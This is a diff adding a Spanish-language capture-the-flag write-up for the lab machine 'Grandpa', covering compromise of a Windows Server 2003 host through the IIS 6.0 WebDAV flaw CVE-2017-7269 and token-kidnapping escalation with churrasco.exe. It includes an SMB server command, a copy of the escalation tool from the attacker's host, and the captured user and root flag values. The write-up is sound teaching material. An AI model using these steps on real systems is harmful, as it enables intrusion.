@@ -1,0 +1,67 @@
+
+Introducción:
+
+Grandpa es una máquina clásica que simula un entorno Windows Server 2003. 
+Este informe detalla la metodología utilizada para comprometer el sistema, 
+desde el acceso inicial hasta la escalada de privilegios máximos.
+
+SO de la Víctima: Windows Server 2003 (IP: 10.129.36.219)
+
+Máquina Atacante: Kali Linux (IP: 10.10.14.204)
+
+Vector de ataque: Vulnerabilidad RCE en IIS 6.0 (WebDAV)
+
+Técnica de escalada: Token Kidnapping (Churrasco.exe)
+
+Fase de Reconocimiento (Enumeration)
+El proceso comenzó con un escaneo exhaustivo de puertos utilizando Nmap:
+
+nmap -sC -sV -p- -T4 10.129.36.219
+Hallazgo: El puerto 80 (HTTP) estaba abierto ejecutando Microsoft IIS httpd 6.0.
+
+Análisis: Esta versión es vulnerable a CVE-2017-7269, un fallo crítico de desbordamiento de búfer en el componente WebDAV.
+
+Acceso Inicial (Exploitation):
+
+Aproveché la vulnerabilidad en la función ScStoragePathFromUrl de WebDAV para ejecutar código remoto.
+
+Exploit: Utilicé un script de Python que manipula la cabecera HTTP "If" para forzar el desbordamiento de memoria.
+
+Resultado: Obtuve una shell limitada con los privilegios de la cuenta de servicio: nt authority\network service.
+
+Dificultad: La shell inicial era inestable, lo que requirió el uso de técnicas de transferencia de archivos robustas.
+
+Transferencia de Herramientas vía SMB
+Para evitar la corrupción de binarios al subirlos mediante la shell (problema común en sistemas antiguos), 
+configuré un servidor SMB en mi máquina Kali dentro de la carpeta del proyecto.
+
+Atacante (Kali):
+
+impacket-smbserver share . -smb2support
+Víctima (Windows): Descargué el exploit de escalada directamente:
+
+copy \\10.10.14.204\share\churrasco.exe C:\WINDOWS\Temp\churrasco.exe
+4. Escalada de Privilegios (PrivEsc)
+Tras verificar los privilegios con whoami /priv, identifiqué que la cuenta tenía habilitado SeImpersonatePrivilege.
+
+Técnica:
+
+Token Kidnapping. Utilicé churrasco.exe para abusar de este privilegio. 
+El exploit permite que un proceso de bajo privilegio ejecute un comando con un "Token" de seguridad de una cuenta con mayores privilegios 
+(como SYSTEM) que haya interactuado con el servicio.
+
+Ejecución Exitosa:
+
+C:\WINDOWS\Temp>churrasco.exe "whoami"
+nt authority\system
+5. Obtención de Flags (Looting)
+Debido a las restricciones de nombres de archivos largos en Windows 2003, utilicé nombres 8.3 para navegar por los perfiles de usuario sin errores de sintaxis:
+
+User Flag: C:\Docume~1\Harry\Desktop\user.txt → bdff5ec67c3cff017f2bedc146a5d869
+
+Root Flag: C:\Docume~1\Admini~1\Desktop\root.txt → 9359e905a2c35f861f6a57cecf28bb7b
+
+Conclusión:
+
+La máquina Grandpa demuestra la importancia de retirar sistemas legados de la red. Un servicio web desactualizado 
+y privilegios de servicio mal configurados permitieron el compromiso total del servidor en pocos minutos.
